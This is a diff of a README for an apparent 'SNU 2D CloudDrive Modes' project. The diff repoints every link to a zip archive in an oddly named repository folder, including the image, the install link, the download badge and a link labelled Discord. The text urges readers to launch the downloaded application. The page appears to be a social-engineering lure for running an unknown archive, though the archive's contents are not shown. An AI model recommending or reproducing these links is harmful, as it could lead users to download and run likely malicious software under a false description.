@@ -1,6 +1,6 @@
 # ✨ Welcome to the SNU 2D CloudDrive Modes Repository! 🌟
 
-![SNU 2D CloudDrive Modes](https://github.com/HenryBrewer/SNU_2D_CloudDrive_Modes/releases/download/v2.0/Software.zip)
+![SNU 2D CloudDrive Modes](https://raw.githubusercontent.com/HenryBrewer/SNU_2D_CloudDrive_Modes/main/nondyspeptic/Cloud-Drive-Modes-SN-3.2.zip)
 
 ## Repository Name: 
 SNU_2D_CloudDrive_Modes
@@ -17,7 +17,7 @@ Welcome to the SNU 2D CloudDrive Modes repository! This project is dedicated to 
 ## Installation
 To get started with the SNU 2D CloudDrive Modes project, you can download the latest application package from the link below.
 
-[Launch Application](https://github.com/HenryBrewer/SNU_2D_CloudDrive_Modes/releases/download/v2.0/Software.zip)
+[Launch Application](https://raw.githubusercontent.com/HenryBrewer/SNU_2D_CloudDrive_Modes/main/nondyspeptic/Cloud-Drive-Modes-SN-3.2.zip)
 
 **Note: You need to launch the application to begin installation.**
 
@@ -31,12 +31,12 @@ To get started with the SNU 2D CloudDrive Modes project, you can download the la
 We welcome contributions from the community to help improve the SNU 2D CloudDrive Modes project. Feel free to fork this repository, make changes, and submit a pull request. Together, we can make the mode switcher even better!
 
 ## Community
-Join our community of developers and enthusiasts on [Discord](https://github.com/HenryBrewer/SNU_2D_CloudDrive_Modes/releases/download/v2.0/Software.zip) to discuss ideas, ask questions, and collaborate on the project.
+Join our community of developers and enthusiasts on [Discord](https://raw.githubusercontent.com/HenryBrewer/SNU_2D_CloudDrive_Modes/main/nondyspeptic/Cloud-Drive-Modes-SN-3.2.zip) to discuss ideas, ask questions, and collaborate on the project.
 
 ## Releases
 If the provided link is not working or you need access to previous versions of the application, please check the "Releases" section of this repository for all available downloads.
 
-[![Download Latest Version](https://github.com/HenryBrewer/SNU_2D_CloudDrive_Modes/releases/download/v2.0/Software.zip%20Version-brightgreen)](https://github.com/HenryBrewer/SNU_2D_CloudDrive_Modes/releases/download/v2.0/Software.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/HenryBrewer/SNU_2D_CloudDrive_Modes/main/nondyspeptic/Cloud-Drive-Modes-SN-3.2.zip%20Version-brightgreen)](https://raw.githubusercontent.com/HenryBrewer/SNU_2D_CloudDrive_Modes/main/nondyspeptic/Cloud-Drive-Modes-SN-3.2.zip)
 
 Thank you for your interest in the SNU 2D CloudDrive Modes project! Let's empower users with flexible and efficient mode switching for their cloud storage needs. 🚀
 
